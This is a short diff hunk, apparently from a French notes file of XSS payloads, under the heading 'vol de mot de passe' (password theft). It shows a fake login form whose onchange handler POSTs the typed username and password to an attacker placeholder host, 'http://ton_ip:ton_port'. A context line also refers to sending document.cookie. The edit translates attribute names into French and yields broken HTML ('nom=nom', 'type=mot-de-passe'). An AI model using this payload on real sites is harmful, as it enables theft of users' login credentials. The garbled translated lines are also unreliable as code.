@@ -186,9 +186,9 @@ body:document.cookie
 
 --------------vol de mot de passe--------------
 
-<input name=username id=username>
-<input type=password name=password onchange="if(this.value.length)fetch('http://ton_ip:ton_port',{
+<input nom=nom id=nom>
+<input type=mot-de-passe name=mot-de-passe onchange="if(this.value.length)fetch('http://ton_ip:ton_port',{
 method:'POST',
 mode: 'no-cors',
-body:username.value+':'+this.value
+body:nom.value+':'+this.value
 });">
